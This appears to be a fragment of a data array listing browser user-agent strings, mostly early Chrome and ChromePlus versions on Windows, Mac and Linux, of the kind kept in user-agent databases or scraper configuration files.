"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.4 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.33 Safari/532.0",
"Mozilla/4.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.33 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.3 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.3 Safari/532.0",
"Mozilla/6.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML,like Gecko) Chrome/3.0.195.27",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.24 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.24 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.21 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.21 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.21 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.21 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.20 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.20 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.17 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.17 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.10 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.10 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.10 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.1 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.1 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.1 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.1 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/531.4 (KHTML, like Gecko) Chrome/3.0.194.0 Safari/531.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.4 (KHTML, like Gecko) Chrome/3.0.194.0 Safari/531.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.3 (KHTML, like Gecko) Chrome/3.0.193.2 Safari/531.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/531.3 (KHTML, like Gecko) Chrome/3.0.193.2 Safari/531.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/531.3 (KHTML, like Gecko) Chrome/3.0.193.2 Safari/531.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/531.3 (KHTML, like Gecko) Chrome/3.0.193.0 Safari/531.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/531.3 (KHTML, like Gecko) Chrome/3.0.192 Safari/531.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.2 (KHTML, like Gecko) Chrome/3.0.191.3 Safari/531.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/3.0.191.0 Safari/531.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/3.0.191.0 Safari/531.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/2.0.182.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/2.0.182.0 Safari/531.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.0 (KHTML, like Gecko) Chrome/2.0.182.0 Safari/531.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.8 (KHTML, like Gecko) Chrome/2.0.178.0 Safari/530.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.8 (KHTML, like Gecko) Chrome/2.0.177.1 Safari/530.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.8 (KHTML, like Gecko) Chrome/2.0.177.0 Safari/530.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.7 (KHTML, like Gecko) Chrome/2.0.177.0 Safari/530.7",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.7 (KHTML, like Gecko) Chrome/2.0.176.0 Safari/530.7",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.7 (KHTML, like Gecko) Chrome/2.0.176.0 Safari/530.7",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/530.7 (KHTML, like Gecko) Chrome/2.0.175.0 Safari/530.7",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.7 (KHTML, like Gecko) Chrome/2.0.175.0 Safari/530.7",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.175.0 Safari/530.6",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.6",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.6",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.6",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.5",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.6",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.173.1 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.173.1 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.173.0 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.8 Safari/530.5",
"Mozilla/6.0 (Windows; U; Windows NT 6.0; en-US) Gecko/2009032609 Chrome/2.0.172.6 Safari/530.7",
"Mozilla/6.0 (Windows; U; Windows NT 6.0; en-US) Gecko/2009032609 (KHTML, like Gecko) Chrome/2.0.172.6 Safari/530.7",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.6 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.42 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.40 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.40 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.39 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.39 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.23 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.2 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.2 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.4",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; eu) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.4",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.4",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.171.0 Safari/530.4",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.1 (KHTML, like Gecko) Chrome/2.0.170.0 Safari/530.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.1 (KHTML, like Gecko) Chrome/2.0.169.0 Safari/530.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.1 (KHTML, like Gecko) Chrome/2.0.168.0 Safari/530.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.1 (KHTML, like Gecko) Chrome/2.0.164.0 Safari/530.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.0 (KHTML, like Gecko) Chrome/2.0.162.0 Safari/530.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.0 (KHTML, like Gecko) Chrome/2.0.160.0 Safari/530.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/528.10 (KHTML, like Gecko) Chrome/2.0.157.2 Safari/528.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.10 (KHTML, like Gecko) Chrome/2.0.157.2 Safari/528.10",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/528.10 (KHTML, like Gecko) Chrome/2.0.157.2 Safari/528.10",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/528.11 (KHTML, like Gecko) Chrome/2.0.157.0 Safari/528.11",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.9 (KHTML, like Gecko) Chrome/2.0.157.0 Safari/528.9",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.11 (KHTML, like Gecko) Chrome/2.0.157.0 Safari/528.11",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.10 (KHTML, like Gecko) Chrome/2.0.157.0 Safari/528.10",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.1 Safari/528.8",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.1 Safari/528.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.1 Safari/528.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.0 Version/3.2.1 Safari/528.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.0 Safari/528.8",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/1.0.156.0 Safari/528.8",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19",
"Mozilla/4.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.55 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.55 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.50 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.50 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.48 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.46 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.43 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.43 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.43 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.43 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.42 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.4.154.31 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.4.154.18 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.4 (KHTML, like Gecko) Chrome/0.3.155.0 Safari/528.4",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.3.155.0 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.3.154.9 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.3.154.6 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.0 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.0 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.152.0 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.152.0 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.151.0 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.151.0 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.151.0 Safari/525.19",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.6 Safari/525.13",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.6 Safari/525.13",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.30 Safari/525.13",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.30 Safari/525.13",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; de) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13(KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13",
"Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13",
"Mozilla/5.0 (Macintosh; U; Mac OS X 10_6_1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5",
"Mozilla/5.0 (Macintosh; U; Mac OS X 10_5_7; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.9 (KHTML, like Gecko) Chrome/ Safari/530.9",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/ Safari/530.6",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.28.3 (KHTML, like Gecko) Version/3.2.3 ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/525.28.3",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30 ChromePlus/1.6.3.1",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30 ChromePlus/1.6.3.0alpha4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.98 Safari/534.13 ChromePlus/1.6.0.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.98 Safari/534.13 ChromePlus/1.5.3.0alpha4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10 ChromePlus/1.5.2.0alpha1",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10 ChromePlus/1.5.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10 ChromePlus/1.5.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10 ChromePlus/1.5.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.0alpha3 ChromePlus/1.5.1.0alpha3 ChromePlus/1.5.1.0alpha3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.216 Safari/534.10 ChromePlus/1.5.1.0alpha1",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7 ChromePlus/1.5.0.0alpha1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7 ChromePlus/1.5.0.0alpha1",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7 ChromePlus/1.5.0.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7 ChromePlus/1.5.0.0 ChromePlus/1.5.0.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7 ChromePlus/1.4.3.0alpha3",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4 ChromePlus/1.4.1.0alpha1",
